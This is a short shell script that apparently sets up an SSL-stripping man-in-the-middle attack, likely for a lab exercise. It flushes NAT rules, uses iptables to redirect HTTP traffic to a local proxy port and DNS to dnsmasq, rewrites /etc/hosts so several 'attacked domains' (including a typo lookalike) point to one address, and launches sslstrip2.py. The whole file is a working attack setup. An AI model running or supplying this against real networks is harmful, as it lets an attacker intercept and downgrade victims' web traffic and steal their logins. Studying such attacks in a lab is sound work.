#!/bin/sh

PROXY_PORT=4242

iptables -t nat -F

# Redirect 80 -> PROXY
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $PROXY_PORT

# Redirect 53 -> Dnsmasq
iptables -t nat -A PREROUTING -p udp -m state --state NEW --destination-port 53 -j REDIRECT --to-port 53

# Resolve attacked domains
echo "147.210.12.1 www.opeth.local opeth.local" > /etc/hosts
echo "147.210.12.1 www.opeth.secure opeth.secure" >> /etc/hosts
echo "147.210.12.1 wwww.opeth.secure" >> /etc/hosts
service dnsmasq restart

/mnt/host/sslstrip2.py $PROXY_PORT
